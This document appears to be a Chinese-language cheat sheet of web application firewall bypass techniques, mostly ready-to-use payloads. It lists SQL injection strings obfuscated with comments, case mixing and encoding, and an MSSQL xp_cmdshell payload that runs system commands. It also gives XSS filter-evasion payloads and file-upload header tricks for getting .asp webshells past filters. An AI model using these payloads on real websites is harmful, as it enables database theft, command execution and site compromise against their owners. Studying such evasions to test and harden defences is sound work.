## waf绕过
伪造XFF头位127.0.0.1（waf一看请求来自自己，直接放行了）（burp的扩展）
或者找出真实ip绕过（比如说反向代理模式）

通过工具伪造百度，谷歌等user agent头或者伪造白名单特殊目录（因为这些ua头或者目录可能在waf白名单里，爬虫白名单）

编码绕过

修改请求方式绕过

# 复合参数绕过
```
比如一个get请求是
	GET /pen/news.php?id=1 union select user,password from mysql.user
可以修改为
	GET /pen/news.php?id=1&id=union&id=select&id=user,password&id=from%20mysql.user
	很多都可以这样绕过
```

# 特殊字符替换空格
在sqlserver中可以用/* */代替空格，要找那些内联注释是不在黑名单里的，
```
http://192.168.222.128/test/sql.php?id=1 /*!union*//*%!aa*//*!select*/ 1,2,3
```

# 特殊字符拼接
把特殊字符拼接起来绕过WAF的检测，比如在Mysql中，可以利用注释/**/来绕过，在mssql中，函数里面可以用+来拼接
如：GET /pen/news.php?id=1;exec(master..xp_cmdshell 'net user')
可以改为：GET /pen/news.php?id=1; exec('maste'+'r..xp'+'_cmdshell'+'"net user"')

# 注释包含关键字
在mysql中，可以利用/*!*/包含关键词进行绕过，在mysql中这个不是注释，而是取消注释的内容。**测试最新版本的****WAF****可以完美绕过。**
```
如: GET /pen/news.php?id=1 union select user,password from mysql.user
可以改为: GET /pen/news.php?id=1 /*!union*/ /*!select*/  user,password /*!from*/ mysql.user
```

# 空格替换法

   把空格替换成%0a/\*\*/可以绕过最新版本WAF, 在Pangolin中 点击 编辑-- 配置-- 高级-- 选择替换空格使用-- 填上%0a/\*\*/即可

# 内联注释法
通过内联注释把恶意语句拆分开
```sql
SELECT * FROM users WHERE username = 'admin'/* this is a comment */OR/* another comment */'1'='1';
实际上执行是
SELECT * FROM users WHERE username = 'admin' OR '1'='1';

```
**`/*!11440select*/`**：

- 这是一个 MySQL 特有的技巧。`/*!...*/` 是一个版本特定的注释块，在这里，`11440` 指定了一个 MySQL 版本号（实际版本号可以随意指定）。WAF 可能会忽略这个注释块，从而达到绕过的效果。实际执行时，`select` 语句会被执行，而不是被注释掉。
- 比如如果数字是50001表示加入数据库是5.00.01以及以上的般般，该语句才会被执行，有的数字是不能执行的，实战的时候可以fuzz一下
```sql
-1' union /*!11440select*/ group_concat(table_name),2 from information_schema.tables where table_schema=database/*!77777cz*/()#
```0
# 大小写法
大小写有时候能绕过关键字检测
```sql
http://www.***.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4….
```

# 关键字替换
```sql
http://www.***.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4….
此方法适用于一些会把union select替换掉的WAF，经过WAF过滤后就会变成 union select 1,2,3,4....
```

编码结合注释
```sql
 http://www.***.com/index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4…

[http://192.168.0.142:8080/sql.php?id=1/*!50000*/union/*!50000*/select/*!50000*/1,user(),3,4,5](http://192.168.0.142:8080/sql.php?id=1/*!50000*/union/*!50000*/select/*!50000*/1,user(),3,4,5)
```

# 符号替换
=号不行就Xor，或者like等能替代的触发的，动动脑筋

# 分块传输
直接使用bp的插件，一般都是post才行，与服务器保持链接，数据分好几次发完

# xss绕过规则
换标签
<video src=1 onerror=alert(/xss)>
<details open ontoggle=alert(/xss/)>
<button onfocus=alert(/xss/) autofocus>
top可以连接对象以及属性或函数

<details open ontoggle=top.alert(1)>    //注，在goole浏览器实用

<details open ontoggle=top[‘prompt’](1)>

<details open ontoggle=top[‘al’%2b’ert’](1)> %2b为url编码的+

%27"><details%20open%20ontoggle=eval(%27alert(1)%27)>

使用concat来拼接字符串javascript:alert(1)

<iframe onload=location=’javascri’.concat(‘pt:aler’,’t(1)’)>

<script>alert(1)</script>Ascii编码

<body/onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62)) >

<svg/onload=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41))>

其他：用/代替空格作为分隔

Base64编码：  
<details open ontoggle=eval(atob(‘YWxlcnQoMSk=’)) >  
eval拦截的话，可以试试，把 e Unicode编码  
<details open ontoggle=\u0065val(atob(‘YWxlcnQoMSk=’)) >  
url编码：  
<details open ontoggle=%65%76%61%6c(atob(‘YWxlcnQoMSk=’)) >  
url编码：  
<details open ontoggle=eval(‘%61%6c%65%72%74%28%31%29’) >  
JS8编码：  
<details open ontoggle=eval(‘\141\154\145\162\164\50\61\51’) >  
Ascii码绕过：  
<details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41)) >  
其他自测

# 文件上传

1                突破0，文件名前缀加[0x09]绕过：
1                突破1，文件名去掉双引号绕过：
1                突破2，添加一个filename1的文件名参数，并赋值绕过：
1                突破3， form变量改成f+orm组合绕过：
1                突破4 ，文件名后缀大小写绕过：
1                突破5 ，去掉form-data变量绕过：
1                突破6，在Content-Disposition:后添加多个空格 或者在form-data;后添加多个空格绕过：
`——WebKitFormBoundary2smpsxFB3D0KbA7D
ConTent-Disposition: form-data                                 ; name=”filepath”; filename=”backlion.asp”
Content-Type: text/html`
1                突破7 ，backlion.asp . (空格+.)绕过：
——WebKitFormBoundary2smpsxFB3D0KbA7D
ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.asp .”
Content-Type: text/html

1                突破8 ，“回车换行，绕过：
——WebKitFormBoundary2smpsxFB3D0KbA7D
ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.asp
”
Content-Type: text/html
1                突破9 ，NTFS流 在文件名后加::$DATA绕过：
——WebKitFormBoundary2smpsxFB3D0KbA7D
ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.asp::$DATA”
Content-Type: text/html
1                突破10， 经过对IIS 6.0的测试发现，其总是采用第一个（也就是双文件上传）Content-Disposition中的值做为接收参数，而安全狗总是以最后一个Content-Disposition中的值做为接收参数。因此尝试构造如下请求[上传backlion.asp成功]：
Content-Disposition: form-data; name=”FileUploadName”; filename=”backlion.asp”
1                突破11，将Content-Type和ConTent-Disposition调换顺序位置绕过：
1                突破12，在文件名前缀加空格（tab键可替换）绕过：
ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.asp”
1                突破13，在form-data加空格绕过：
1                突破14，在form-data的前后加上+绕过：